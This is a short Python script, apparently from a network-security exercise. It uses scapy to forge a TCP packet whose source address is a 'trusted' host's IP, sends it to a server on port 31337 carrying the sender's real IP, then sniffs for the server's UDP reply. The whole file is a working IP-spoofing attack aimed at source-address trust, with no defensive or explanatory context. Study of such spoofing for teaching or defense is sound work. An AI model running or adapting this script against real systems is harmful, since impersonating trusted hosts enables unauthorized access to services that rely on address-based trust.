from scapy.all import *


def main(args):
  localip = args[0]
  serverip = args[1]
  trustedip = args[2]
  trustedport = 31337
  
  spoof = IP(src=trustedip, dst=serverip) / TCP(dport=trustedport) / Raw(localip)
  spoof.show()
  send(spoof)
  fs = "udp and host " + localip + " and port " + str(trustedport)
  pkts = sniff(filter=fs, count=1)
  pkts.show()
  
  
if __name__ == "__main__":
  main(sys.argv[1:])
